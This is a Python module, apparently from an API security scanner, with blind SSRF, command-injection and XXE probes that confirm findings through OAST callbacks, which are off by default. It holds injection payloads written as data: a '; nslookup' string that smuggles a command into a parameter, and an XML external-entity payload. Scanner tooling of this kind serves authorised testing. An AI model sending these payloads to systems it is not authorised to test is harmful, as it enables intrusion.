"""Phase 5: OAST-correlated blind vulnerability checks.

Upgrades blind SSRF, command injection, XXE, SSTI, and webhook checks to use
OAST provider tokens for callback correlation. No OAST traffic occurs without
explicit configuration; the default disabled provider refuses allocation.
"""

from __future__ import annotations

import time
from dataclasses import dataclass, field
from typing import Any, Dict, List, Optional, Tuple

import requests

from oast import DisabledOASTProvider, MemoryOASTProvider, OASTAllocation, OASTProvider
from spec_parser import Endpoint


@dataclass
class BlindFinding:
    category: str
    severity: str
    confidence: str
    title: str
    endpoint: str
    method: str
    parameter: str
    evidence: str
    owasp_api: str
    cwe: str
    request_url: str
    status_code: int = 0
    callback_received: bool = False


def _auth_headers(auth_header: Optional[str]) -> Dict[str, str]:
    if not auth_header:
        return {}
    return {"Authorization": auth_header}


def probe_blind_ssrf(
    endpoint: Endpoint,
    base_url: str,
    session: requests.Session,
    timeout: float,
    oast: OASTProvider,
    auth_header: Optional[str] = None,
) -> List[BlindFinding]:
    """Test for blind SSRF using OAST callback tokens in URL-like parameters."""
    findings: List[BlindFinding] = []
    if not oast.available:
        return findings

    headers = _auth_headers(auth_header)
    url = base_url.rstrip("/") + endpoint.path
    url_params = [p for p in endpoint.parameters if p.location in ("query", "body")]

    for param in url_params:
        try:
            allocation = oast.allocate(check_id=f"ssrf:{param.name}")
        except Exception:
            continue

        if param.location == "query":
            params = {p.name: p.example if p.example is not None else "test"
                       for p in endpoint.parameters if p.location == "query"}
            params[param.name] = allocation.http_url
            try:
                resp = session.request(
                    endpoint.method, url, params=params, headers=headers,
                    timeout=timeout, allow_redirects=False,
                )
            except requests.exceptions.RequestException:
                continue
        elif param.location == "body" and isinstance(endpoint.body_example, dict):
            import copy
            body = copy.deepcopy(endpoint.body_example)
            body[param.name] = allocation.http_url
            try:
                resp = session.request(
                    endpoint.method, url, json=body, headers=headers,
                    timeout=timeout, allow_redirects=False,
                )
            except requests.exceptions.RequestException:
                continue
        else:
            continue

        # Poll for callback interactions.
        time.sleep(0.1)
        interactions = oast.poll(allocation)
        if interactions:
            findings.append(BlindFinding(
                category="blind_ssrf",
                severity="high",
                confidence="confirmed",
                title=f"Blind SSRF: callback received from {param.name}",
                endpoint=endpoint.path,
                method=endpoint.method,
                parameter=param.name,
                evidence=(
                    f"OAST token {allocation.token} received {len(interactions)} "
                    f"interaction(s) after injecting {allocation.http_url}."
                ),
                owasp_api="API7:2023",
                cwe="CWE-918",
                request_url=url,
                status_code=getattr(resp, "status_code", 0),
                callback_received=True,
            ))
    return findings


def probe_blind_command_injection(
    endpoint: Endpoint,
    base_url: str,
    session: requests.Session,
    timeout: float,
    oast: OASTProvider,
    auth_header: Optional[str] = None,
) -> List[BlindFinding]:
    """Test for blind command injection using OAST DNS callbacks."""
    findings: List[BlindFinding] = []
    if not oast.available:
        return findings

    headers = _auth_headers(auth_header)
    url = base_url.rstrip("/") + endpoint.path
    injectable_params = [p for p in endpoint.parameters if p.location in ("query", "body")]

    for param in injectable_params:
        try:
            allocation = oast.allocate(check_id=f"cmd:{param.name}")
        except Exception:
            continue

        # Use a DNS-based callback that would be triggered by `nslookup` or `curl`.
        dns_payload = f"; nslookup {allocation.dns_name} #"
        if param.location == "query":
            params = {p.name: p.example if p.example is not None else "test"
                       for p in endpoint.parameters if p.location == "query"}
            params[param.name] = dns_payload
            try:
                session.request(
                    endpoint.method, url, params=params, headers=headers,
                    timeout=timeout, allow_redirects=False,
                )
            except requests.exceptions.RequestException:
                continue
        elif param.location == "body" and isinstance(endpoint.body_example, dict):
            import copy
            body = copy.deepcopy(endpoint.body_example)
            body[param.name] = dns_payload
            try:
                session.request(
                    endpoint.method, url, json=body, headers=headers,
                    timeout=timeout, allow_redirects=False,
                )
            except requests.exceptions.RequestException:
                continue
        else:
            continue

        time.sleep(0.1)
        interactions = oast.poll(allocation)
        if interactions:
            findings.append(BlindFinding(
                category="blind_command_injection",
                severity="critical",
                confidence="confirmed",
                title=f"Blind command injection: DNS callback from {param.name}",
                endpoint=endpoint.path,
                method=endpoint.method,
                parameter=param.name,
                evidence=(
                    f"OAST token {allocation.token} received {len(interactions)} "
                    f"DNS interaction(s) after injecting '{dns_payload}'."
                ),
                owasp_api="API8:2023",
                cwe="CWE-78",
                request_url=url,
                callback_received=True,
            ))
    return findings


def probe_blind_xxe(
    endpoint: Endpoint,
    base_url: str,
    session: requests.Session,
    timeout: float,
    oast: OASTProvider,
    auth_header: Optional[str] = None,
) -> List[BlindFinding]:
    """Test for blind XXE using OAST callbacks in XML bodies."""
    findings: List[BlindFinding] = []
    if not oast.available or not endpoint.has_body:
        return findings

    headers = _auth_headers(auth_header)
    headers["Content-Type"] = "application/xml"
    url = base_url.rstrip("/") + endpoint.path

    try:
        allocation = oast.allocate(check_id="xxe")
    except Exception:
        return findings

    xxe_payload = (
        f'<?xml version="1.0"?>'
        f'<!DOCTYPE foo [<!ENTITY xxe SYSTEM "{allocation.http_url}">]>'
        f'<foo>&xxe;</foo>'
    )
    try:
        resp = session.request(
            endpoint.method, url, headers=headers,
            data=xxe_payload.encode("utf-8"), timeout=timeout, allow_redirects=False,
        )
    except requests.exceptions.RequestException:
        return findings

    time.sleep(0.1)
    interactions = oast.poll(allocation)
    if interactions:
        findings.append(BlindFinding(
            category="blind_xxe",
            severity="critical",
            confidence="confirmed",
            title="Blind XXE: OAST callback received",
            endpoint=endpoint.path,
            method=endpoint.method,
            parameter="<body>",
            evidence=f"OAST token {allocation.token} received {len(interactions)} interaction(s) after XXE payload.",
            owasp_api="API8:2023",
            cwe="CWE-611",
            request_url=url,
            status_code=resp.status_code,
            callback_received=True,
        ))
    return findings
